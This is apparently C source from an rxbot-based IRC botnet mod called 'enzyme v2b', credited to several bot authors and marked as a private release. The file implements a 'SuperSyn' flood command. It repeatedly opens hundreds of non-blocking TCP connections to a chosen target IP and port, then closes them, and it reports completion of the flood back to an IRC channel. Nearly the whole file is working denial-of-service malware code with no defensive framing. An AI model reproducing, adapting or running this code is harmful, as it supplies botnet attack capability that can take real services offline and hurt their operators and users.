/*
 XXXXX   XXXXXX   XXXXXXX   XXX XXX XXXXXXX   XXXXX
XXX XXX  XXX XXX  XX  XXX   XXX XXX XXXXXXXX XXX XXX
XXXXXXX  XXX XXX     XXX    XXX XXX XXXXXXXX XXXXXXX
XXX      XXX XXX   XXX      XXX XXX XXXXXXXX XXX
XXX XXX  XXX XXX  XXX  XX    XXXXX  XXXXXXXX XXX XXX
 XXXXX   XXX XXX  XXXXXXX      XXX  XXX  XXX  XXXXX
                              XXX               .v2b
                           XXXXX
 ____________________
+ enzyme ..v2b       +
| nzm rxbot mod ..   |
| private release *  |
| 04.04.05	         |
+____________________+
		      ____________________
 		     + code from ..       +
		     | bcuzz              |
		     | stoney  		      |
		     | x-lock	          |
		     | ionix              |
		     | phatty		      |
		     | nesespray	      |
		     | rbot dev team 	  |
		     +____________________+
 ____________________
+ read ..            +
| the docs           |
| don't ..           |
| mass distribute    |
+____________________+

*/


#include "../../headers/includes.h"
#include "../../headers/functions.h"
#include "../../headers/externs.h"

#ifndef NO_SUPERSYN

#define MAX_PACK_LEN 65535
#define SIO_RCALL 0x98000001
#define SUPERSYN_SOCKETS 400


#define SYN_DPORT 2000
#define SYN_XORVAL 0xFFFFFFFF
#define SYN_SPOOF_TEST 2001
#define SYN_SPOOF_GOOD 2002

DWORD WINAPI SuperSynThread(LPVOID param)
{
	char sendbuf[IRCLINE];

	SUPERSYN supersyn = *((SUPERSYN *)param);
	SUPERSYN *supersyns = (SUPERSYN *)param;
	supersyns->gotinfo = TRUE;

	sprintf(sendbuf, "[SUPERSYN]: Done with flood (%iKB/sec)", SuperSyn(supersyn.ip, supersyn.port, supersyn.length));
	if (!supersyn.silent) irc_privmsg(supersyn.sock, supersyn.chan, sendbuf, supersyn.notice);
	addlog(sendbuf);

	clearthread(supersyn.threadnum);

	ExitThread(0);
}

long SuperSynSend(unsigned long TargetIP, unsigned short TargetPort, int len)
{
	int superdelay = 100;
	SOCKADDR_IN    SockAddr;
	SOCKET         sock[SUPERSYN_SOCKETS];
   	IN_ADDR iaddr;
	memset(&SockAddr, 0, sizeof(SockAddr));
	SockAddr.sin_family = AF_INET;
   	SockAddr.sin_port = fhtons(TargetPort);
	LPHOSTENT lpHostEntry = NULL;
 	DWORD mode = 1;
	int c,i;
	iaddr.s_addr = TargetIP;
	SockAddr.sin_addr = iaddr; //ip addy
	i = 0;
	while (i < len) {
		for (c=0;c<SUPERSYN_SOCKETS;c++)
		{
			sock[c] = socket(AF_INET, SOCK_STREAM, 0);
   			if (sock[c] == INVALID_SOCKET)
      				continue;
			ioctlsocket(sock[c],FIONBIO,&mode);
		}
		for (c=0;c<SUPERSYN_SOCKETS;c++)
  			connect(sock[c], (PSOCKADDR) &SockAddr, sizeof(SockAddr));
      		Sleep(superdelay);
		for (c=0;c<SUPERSYN_SOCKETS;c++)
			closesocket(sock[c]); //close sockets
		i++;
	}
	return 0;
}

long SuperSyn(char *target, char *port, char *len)
{
	unsigned long TargetIP = ResolveAddress(target);
	unsigned short p = (unsigned short)atoi(port);
	int t = atoi(len);

	long num = SuperSynSend(TargetIP, p, t);

	if (num == 0)
		num = 1;
	num = num / 1000 / t;

	return num;
}

#endif
